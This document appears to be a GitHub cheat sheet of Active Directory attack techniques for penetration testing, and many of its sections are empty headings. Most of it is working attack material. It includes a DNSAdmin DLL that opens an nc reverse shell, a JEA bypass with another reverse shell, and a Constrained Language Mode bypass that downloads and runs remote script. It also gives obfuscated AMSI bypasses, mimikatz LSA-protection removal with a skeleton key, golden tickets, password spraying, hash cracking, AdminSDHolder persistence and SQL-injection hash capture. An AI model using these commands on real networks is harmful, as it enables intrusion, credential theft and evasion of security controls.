This AD attacks CheatSheet, made by RistBS is inspired by the [Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) repo.

it is the first version of this repo, many things will be added later, so stay tuned ! :D


<a href="https://ibb.co/z7DSpds"><img src="https://i.ibb.co/pR53cq2/attack-kill-chain-small.jpg" alt="attack-kill-chain-small" border="0" /></a>

# Active-directory-Cheat-sheet
## Summary

- [AD Exploitation Cheat Sheet by RistBS](#active-directory-exploitation-cheat-sheet)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Powershell Components](#powershell-components)
    - [Powershell Tricks](#powershell-tricks)
    - [PSWA Abusing](#pswa-abusing) 
  - [Enumeration](#domain-enumeration)
    - [GPO enumeration](#gpo-enumeration)
    - [ACL and ACE enumeration](#acl-enumeration)
  - [Privilege Escalation](#privilege-escalation)
    - [Token Impersonation](#token-impersonation)
    - [Kerberoasting](#kerberoasting)
    - [ASREPRoasting](#asreproasting)
    - [DNSAdmin](#dnsadmin)
  - [Lateral Mouvement](#lateral-mouvement)
    - [WMIExec](#wmiexec)
    - [Token Impersonation](#token-impersonation)
  - [Credentials Dumping](#credentials-dumping)
    - [LSASS Dumping](#lsass-dumping)
    - [NTDS Dumping](#ntds-dumping)
    - [DPAPI Dumping](#dpapi-dumping)
    - [LSA Dumping](#lsa-dumping)
    - [SAM Dumping](#sam-dumping)
    - [Dump Registry Remotely and Directly](#dump-registry-remotely-and-directly)
  - [Hash Cracking](#hash-cracking)
  - [Brutforce AD Password](#bruteforce-ad-password)
    - [Custom Username and Password wordlist](#custom-username-and-password-wordlist)
  - [RID Cycling](#rid-cycling)
  - [Pivoting](#pivoting)
    - [SMB Pipes](#smb-pipes)
    - [SharpSocks](#sharpsocks)
    - [RDP Tunneling via DVC](#rdp-tunneling-via-dvc)
  - [Persistence](#persistence)
    - [SIDHistory Injection](#sidhistory-injection)
    - [AdminSDHolder and SDProp](#adminsdholder-and-sdprop)
  - [ACLs and ACEs Abusing](#acls-and-aces-abusing)
    - [GenericAll](#genericall)
  - [Enhanced Security Bypass](#enhanced-security-bypass)
    - [AntiMalware Scan Interface](#antimalware-scan-interface)
    - [ConstrainLanguageMode](#constrainlanguagemode)
    - [Just Enough Administration](#just-enough-administration)
    - [ExecutionPolicy](#executionpolicy)
    - [RunAsPPL for Credentials Dumping](#runasppl-for-credentials-dumping)
  - [MS Exchange](#ms-exchange)
    - [OWA Password Spraying](#owa-password-spraying)
    - [GAL and OAB Exfiltration](#gal-and-oab-exfiltration)
    - [PrivExchange](#privexchange)
    - [ProxyLogon](#proxylogon)
    - [CVE-2020-0688](#cve-2020-0688)
  - [MSSQL Server](#mssql-server)
    - [UNC Path Injection](#unc-path-injection)
    - [MC-SQLR Poisoning](#mcsqlr-poisoning)
    - [DML, DDL and Logon Triggers](#dml-ddl-and-logon-triggers)
  - [Forest Persistence](#forest-persistence)
    - [DCShadow](#dcshadow)
  - [Cross Forest Attacks](#cross-forest-attacks)
     - [Trust Tickets](#trust-tickets)
     - [Using KRBTGT Hash]()
  - [Azure Active Directory (AAD)](#azure-active-directory)
    - [AZ User Enumeration](#az-user-enumeration)
    - [PowerZure](#powerzure)
    - [Golden SAML](#golden-saml)
    - [PassTheCRT](#passthecrt)
    - [MSOL Account](#msol-account)
  - [Miscs](#miscs)
    - [Domain Level Attribute](#domain-level-attribute)
      - [MachineAccountQuota (MAQ) Exploitation](#machineaccountquota-maq-exploitation)
      - [Bad-Pwd-Count](#bad-pwd-count)
    - [Abusing IPv6 in AD](#abusing-ipv6-in-ad)
      - [Rogue DHCP](#rogue-dhcp) 
      - [IOXIDResolver Interface Enumeration](#ioxidresolver-interface-enumeration)


## Tools

**Powershell tools :**
- `[⭐] Nishang` -> https://github.com/samratashok/nishang

nishang has multiples useful scripts for windows pentesting in Powershell environement.
- `[⭐] PowerView` -> https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

powerview is a script from powersploit that allow enumeration of the AD architecture for a potential lateral mouvement.

**Enumeration tools :**
- `[⭐] Bloodhound` -> https://github.com/BloodHoundAD/BloodHound
- `[⭐] crackmapexec` -> https://github.com/byt3bl33d3r/CrackMapExe

**AD exploitation toolkit :**
- `[⭐] Impacket` -> https://github.com/SecureAuthCorp/impacket
- `[⭐] kekeo` -> https://github.com/gentilkiwi/kekeo

**Dumping Tools :**
- `[⭐] mimikatz` -> https://github.com/gentilkiwi/mimikatz
- `[⭐] rubeus` -> https://github.com/GhostPack/Rubeus

**Listener Tool :**
- `[⭐] responder` -> https://github.com/SpiderLabs/Responder

## Powershell Components

### Powershell Tricks 

**PS-Session** :

```powershell
#METHOD 1
$c = New-PSSession -ComputerName 10.10.13.100 -Authentication Negociate -Credential $user 
Enter-PSSession -Credential $c -ComputerName 10.10.13.100

# METHOD 2
$pass = ConvertTo-SecureString 'Ab!Q@aker1' -asplaintext -force
$cred = New-Object System.Management.Automation.PSCredential('$user, $pass)
Enter-PSSession -Credential $c -ComputerName 10.10.13.100
```

### PSWA Abusing

allow anyone with creds to connect to any machine and any config

**[ ! ] this action require credentials.**

```powershell
Add-PswaAuthorizationRule -UsernName * -ComputerName * -ConfigurationName *
```


## Enumeration


### Find user with SPN

> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :
```powershell
Get-NetUser –SPN
```
> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```


### Trusts Enumeration

**MapTrust :**

```powershell
Invoke-MapDomainTrust
```

**Domain trusts for the current domain :**

> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :
```powershell
Get-NetDomainTrust #Find potential external trust
Get-NetDomainTrust –Domain us.dollarcorp.moneycorp.local
```

> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :
```powershell
Get-ADTrust
Get-ADTrust –Identity us.dollarcorp.moneycorp.local
```

### Forest Enumeration

**Details about the current forest :**

```powershell
Get-NetForest
Get-NetForest –Forest eurocorp.local
Get-ADForest
Get-ADForest –Identity eurocorp.local
```

### GPO enumeration

**List of GPO**

```powershell
Get-NetGPO
Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local 
Get-GPO -All
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html
```


### ACL and ACE enumeration

**Enumerate All ACEs**

```powershell
 Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq 
$("$env:UserDomain\$env:Username")) {$_}}
```

#### Enumerate users and permissions

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"}
```

*Verify if the user already has a SPN :*
> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :
```powershell
Get-DomainUser -Identity supportuser | select serviceprincipalname
```
> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :
```powershell
Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
```

### LDAP Enumeration 
```powershell
ldapsearch -x -h 10.10.10.x -p 389 -s base namingcontexts
ldapsearch -h 10.10.10.x -p 389 -x -b "dc=boxname,dc=local"
```
*find service accounts*
```powershell
ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=box,dc=local" | grep "service"
```

*Enumeration with ldapsearch as authenticated user*
```powershell
ldapsearch -x -h ldap.megacorp.corp -w '$pass'     
ldapsearch -x -h 10.10.131.164 -p 389 -b "dc=megacorp,dc=corp" -D 'john@megacorp.corp' -w 'vs2k6!'
ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -s base namingcontexts 
ldapsearch -D "cn=binduser,ou=users,dc=megacorp,dc=corp" -w 'J~42%W?]g' -b 'dc=megacorp'
```
*Enumeration with ldapdomaindump (authenticated) with nice output*
```
ldapdomaindump 10.10.197.117 -u 'megacorp.corp\john' -p '$pass' --no-json --no-grep
```
*Enumeration with nmap scripts*
```bash
nmap -p 389 --script ldap-search 10.10.10.x
nmap -n -sV --script "ldap*" -p 389 10.10.10.x
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='MEGACORP.CORP',userdb=/usr/share/wordlists/seclists/Usernames/Names/names.txt 10.10.13.100
```

### SMB Enumeration 

*enumeration with crackmapexec as unauthenticated*
```bash
crackmapexec smb 10.10.10.x --pass-pol -u '' -p ''
```
*enumeration with crackmapexec (authenticated)*
```powershell
crackmapexec smb 10.10.11.129 --pass-pol -u usernames.txt -p $pass --continue-on-sucess
crackmapexec smb 10.10.11.129 --pass-pol -u xlsx_users -p $pass --continue-on-sucess      
```

*enumeration with kerbrute, against Kerberos pre-auth bruteforcing:*
```bash
/opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d megacorp.local --dc 10.10.13.100 -o kerbrute.out users.txt
/opt/kerbrute/dist/kerbrute_linux_amd64 userenum -d megacorp.htb --dc 10.10.13.100 -o kerbrute.out users.lst --downgrade
```
> by default, kerbrute uses the most secure mode (18 = sha1) to pull some hash. Using the downgrade option we can pull the deprecaded encryption type version (23 = rc4hmac). Or use getNPusers to get some hash instead, it's safer! 

*provide a password or a list of passwords to test against users*
```bash
crackmapexec smb 10.10.13.100 --pass-pol -u users.lst -p password_list
```
*Enumerate some users*
```bash
crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
```
### Password Spraying on the domain 
```bash
/opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray -d MEGACORP.CORP --dc 10.10.13.100 users.lst '$pass'
```

## Privilege Escalation

### Token Impersonation

*requirement :*
- have enough privileges


> The Impersonation token technique allows to impersonate a user by stealing his token, this token allows to exploit this technique because of the SSO processes, Interactive Logon, process running...


using [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :


using [Incognito](https://github.com/FSecureLABS/incognito) :




### Kerberoasting

**Enumerate kerberoastable user**
```powershell
Get-DomainUser -SPN | select name,serviceprincipalname
```

*crack the hash :*

```bash
# using JTR :
john --format=krb5tgs spn.txt --wordlist=wordlist.txt 
# using hashcat :
hashcat -m 13100 -a 0 spn.txt wordlist.txt --force
```

### ASREPRoasting

**Enumerate asreproastable user**
```powershell
Get-DomainUser -PreauthNotRequired | select name
```


*cracking the hash :*

`hashcat -m 18200 -a 0 hash wordlist.txt --force`


### DNSAdmin

> Enumerate users in this group :
```powershell
# METHOD 1
Get-NetGroupMember -GroupName "DNSAdmins"
# METHOD 2
Get-ADGroupMember -Identity DNSAdmins
```

*This attack consists of injecting a malicious arbitrary DLL and restarting the dns.exe service, 
since the DC serves as a DNS service, we can elevate our privileges to a DA.*

> DLL File :
```c
#include "stdafx.h"
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		system("c:\\windows\\system32\\spool\\drivers\\color\\nc.exe -e cmd.exe 10.10.14.51 5555");
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
```
you can also create a dll file using msfvenom : `msfvenom -p windows/x64/exec cmd='net user administrator aked /domain' -
f dll > evil.dll`
it'll execute `net user administrator aked /domain` with SYSTEM privileges

set the remote DLL path into the Windows Registry
```powershell
dnscmd dc01 /config /serverlevelplugindll \\10.10.14.33\share\evil.dll
```
`\\10.10.14.33\share\evil.dll` : SMB Share.

**restart DNS service**
```powershell
sc.exe stop dns
sc.exe start dns
```

## Lateral Mouvement

### WMIExec




## Credentials Dumping

### LSASS Dumping

### NTDS Dumping

### DPAPI Dumping

### LSA Dumping

### SAM Dumping

### Dump Registry Remotely and Directly

[ ❓ ] **What is Registry ?** : the Registry is divided into several sections called **hives**. A registry hive is a top level registry key predefined by the Windows system to store **registry keys** for specific objectives. Each registry hives has specific objectives, there are **6 registry hives, HKCU, HKLM, HKCR, HKU, HKCC and HKPD** the most enteresting registry hives in pentesting is HKU and HKLM.

**HKEY_LOCAL_MACHINE** called HKLM includes three keys SAM, SYSTEM, and SECURITY.

> dump SYSTEM and SECURITY directly from HKLM :

```bash
secretsdump.py local -system SYSTEM -security SECURITY -ntds ntds.dit -outputfile hashes
```


> dump HKU registry remotely with hashes argument :
```bash
impacket-reg -hashes :34ed87d42adaa3ca4f5db34a876cb3ab domain.local/john.doe@job query -keyName HKU\\Software

HKU\Software
HKU\Software\GiganticHostingManagementSystem
HKU\Software\Microsoft
HKU\Software\Policies
HKU\Software\RegisteredApplications
HKU\Software\Sysinternals
HKU\Software\VMware, Inc.
HKU\Software\Wow6432Node
HKU\Software\Classes
```



## Hash Cracking

> LM :
```bash
# using JTR :
john --format=lm hash.txt
# using hashcat :
hashcat -m 3000 -a 3 hash.txt
```

> NT :

```bash
# using JTR :
john --format=nt hash.txt --wordlist=wordlist.txt
# using hashcat :
hashcat -m 1000 -a 3 hash.txt
```


> NTLMv1 :

```bash
# using JTR :
john --format=netntlmv1 hash.txt
# using hashcat :
hashcat -m 5500 --force -a 0 hash.txt wordlist.txt
```

> NTLMv2 :

```bash
# using JTR :
john --format=netntlmv2 hash.txt
# using hashcat :
hashcat -m 5600 --force -a 0 hash.txt wordlist.txt
```

note : some Hash Type in hashcat depend of the **etype**

## Brutforce AD Password 

### Custom Username and Password wordlist 

default password list (pwd_list) :
`
Autumn
Spring
Winter
Summer
` 
create passwords using bash & hashcat :
```bash
for i in $(cat pwd_list); do echo $i, echo ${i}\!; echo ${i}2019; echo ${i}2020 ;done > pwds
haschat --force --stdout pwds -r /usr/share/hashcat/rules/base64.rule
haschat --force --stdout pwds -r /usr/share/hashcat/rules/base64.rule -r /usr/share/hashcat/rules/toogles1.r | sort u
haschat --force --stdout pwds -r /usr/share/hashcat/rules/base64.rule -r /usr/share/hashcat/rules/toogles1.r | sort u | awk 'length($0) > 7' > pwlist.txt
```


default username list (users.list) :
```
john doe
paul smith
jacaques miller
```
create custom usernames using username-anarchy :
```bash
./username-anarchy --input-file users.list --select-format first,first.last,f.last,flast > users2.list
```


## RID Cycling 

<a href="https://imgbb.com/"><img src="https://i.ibb.co/zPQ6ntJ/rid.png" alt="rid" border="0"></a>
  
using [Crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec) :
```bash
cme smb $target -u $username -p $password --rid-brute
```
using [lookupsid](https://github.com/SecureAuthCorp/impacket/blob/cd4fe47cfcb72d7d35237a99e3df95cedf96e94f/examples/lookupsid.py) :
```bash
lookupsid.py MEGACORP/$user:'$password'@$target 20000
```
the value "20000" in lookupsid is to indicate how many RID will be tested
  

## Pivoting

### SMB Pipes

### SharpSocks

### RDP Tunneling via DVC
  

## Persistence

### SIDHistory Injection

### AdminSDHolder and SDProp

> [ ❓ ] : With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions\) to the AdminSDHolder object.
In 60 minutes (when SDPROP runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.

> using [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) :
```powershell
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights All -Verbose
```
> using [AD Module](https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps) :
```powershell
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=megacorp,DC=megacorp,DC=local' -Principal $user -Verbose
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights ResetPassword -Verbose
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName $user -Rights WriteMembers -Verbose
```

*Run SDProp manually*
```powershell
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

## ACLs and ACEs Abusing

### GenericAll

**list all groups to which the user belongs and has explicit access rights**
```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```



## Enhanced Security Bypass

### AntiMalware Scan Interface 

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
patching AMSI from Powershell6 :
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
  
### ConstrainLanguageMode

Bypass CLM using **runspace**:

```cs
static void Main(string[] args){
    Runspace run = RunspaceFactory.CreateRunspace();
    run.Open();

    PowerShell shell = PowerShell.Create();
    shell.Runspace = run;

    String cmd = "iex(new-object net.webclient).DownloadString('http://10.10.14.33/script')";
    shell.AddScript(cmd);
    shell.Invoke();
    run.Close();
}
```

### Just Enough Administration

> show current languages level :
```powershell
# METHOD 1
(Get-PSSessionConfiguration -Name Test).LanguageMode
# METHOD 2
$ExecutionContext.SessionState.LanguageMode # use property
```

> Bypass JEA in ConstrainedLanguage :
```powershell
{ C:\Windows\System32\spool\drivers\color\nc.exe -e powershell.exe 10.10.14.33 9003 }
```

### ExecutionPolicy

```powershell
powershell -ExecutionPolicy Bypass -File C:\script.ps1
```

> bypass EP using encoding :

```powershell
$command = "Write-Host 'hello world'"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command);$encoded = [Convert]::ToBase64String($bytes); powershell.exe -EncodedCommand $encoded
```

### RunAsPPL for Credentials Dumping

[ ❓ ] : [RunAsPPL](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) is an **additional LSA protection** to prevent reading memory and code injection by **non-protected processes**.

> bypass RunAsPPL with mimikatz :
```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```


## MS Exchange 

### OWA Password Spraying

### GAL and OAB Exfiltration

### PrivExchange

### ProxyLogon

### CVE-2020-0688


## MSSQL Server 

### UNC Path Injection

[ ❓ ] : Uniform Naming Convention __allows the sharing of resources__ on a network via a very precise syntax: `\IP-Server\shareName\Folder\File`

launch responder : `responder -I eth0`

```sql
EXEC master..xp_dirtree \"\\\\192.168.1.33\\\\evil\";
```
```sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
```

### MC-SQLR Poisoning

*The SQL Server Resolution Protocol is a simple application-level protocol that is used for the transfer of requests and responses between clients and database server discovery services.*

```vbs
CreateObject("ADODB.Connection").Open "Provider=SQLNCLI11;Data Source=DOESNOTEXIST\INSTANCE;Integrated Security=SSPI;"
```
> we captured the hash of the **Administrator** with this VBA script.
```python
[+] Listening for events...
[*] [LLMNR]  Poisoned answer sent to 10.10.14.33 for name doesnotexist
[MSSQL-BROWSER] Sending poisoned browser response to 10.10.14.33
[*] [LLMNR]  Poisoned answer sent to 10.10.14.33 for name doesnotexist
[*] [LLMNR]  Poisoned answer sent to 10.10.14.33 for name doesnotexist
[MSSQL] NTLMv2 Client   : 10.1.2.3
[MSSQL] NTLMv2 Username : TEST\Administrator
[MSSQL] NTLMv2 Hash     : Administrator::TEST:1122334455667788...
```

### DML, DDL and Logon Triggers


## Forest Persistence 

### DCShadow


## Cross Forest Attacks 

### Trust Tickets

### Using KRBTGT hash 

```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domaine.fun.local /sid:S-1-5-x-x-x-x /sids:S-1-5-x-x-x-x-519 /krbtgt:<hash> /ticket:C:\path\krb_tgt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::ptt C:\path\krb_tgt.kirbi
```
 
 
## Azure Active Directory

### AZ User Enumeration

First, we connect to Azure Active Directory with **Connect-MsolService**.
```powershell
PS> Connect-MsolService -Credential $cred
```
this command allow enumeration with MFA (MultiFactor Authentification)
```powershell
Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@{N="MFA Status"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequirements.State} else { "Disabled"}}} | export-csv mfaresults.csv
```

### PowerZure

### Golden SAML

*Requirements :*
- Admin privileges of ADFS server

a toolkit to exploit Golden SAML can be found [here](https://github.com/secureworks/whiskeysamlandfriends)



### PassTheCRT

### MSOL Account


## Miscs 

### Domain Level Attribute 

#### MachineAccountQuota (MAQ) Exploitation 

use crackmapexec (CME) with maq module :

`cme ldap $dc -d $DOMAIN -u $USER -p $PASSWORD -M maq`

#### BadPwnCount
```python
crackmapexec ldap 10.10.13.100 -u $user -p $pwd --kdcHost 10.10.13.100 --users
LDAP        10.10.13.100       389    dc1       Guest      badpwdcount: 0 pwdLastSet: <never>
```


### Abusing IPv6 in AD 

sending ICMPv6 packet to the target using ping6 :

`ping6 -c 3 <target>`

scanning IPv6 address using nmap :

`nmap -6 -sCV dead:beef:0000:0000:b885:d62a:d679:573f --max-retries=2 --min-rate=3000 -Pn -T3`



tips for adapting tools for ipv6 :
```bash
echo -n "port1" "port2" "port3" | xargs -d ' ' -I% bash -c 'socat TCP4-LISTEN:%,fork TCP6:[{ipv6-address-here}]:% &'
netstat -lapute |grep LISTEN
```
you can replace AF_INET value to AF_INET6 from socket python lib :
```bash
sed -i "s/AF_INET/AF_INET6/g" script.py
```

#### Rogue DHCP 

`mitm6 -i eth0 -d 'domain.job.local'`

#### IOXIDResolver Interface Enumeration

it's a little script that enumerate addresses in NetworkAddr field with [**RPC_C_AUTHN_DCE_PUBLIC**](https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-service-constants) level
```py
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import IObjectExporter

RPC_C_AUTHN_DCE_PUBLIC  = 2

stringBinding = r'ncacn_ip_tcp:%s' % "IP"
rpctransport = transport.DCERPCTransportFactory(stringBinding)
rpc = rpctransport.get_dce_rpc()
rpc.set_auth_level(RPC_C_AUTHN_DCE_PUBLIC)
rpc.connect()
print("[*] Try with RPC_C_AUTHN_DCE_PUBLIC...")
exporter = IObjectExporter(rpc)
binding = exporter.ServerAlive2()
for bind in binding:
    adr = bind['aNetworkAddr']
    print("Adresse:", adr)
```
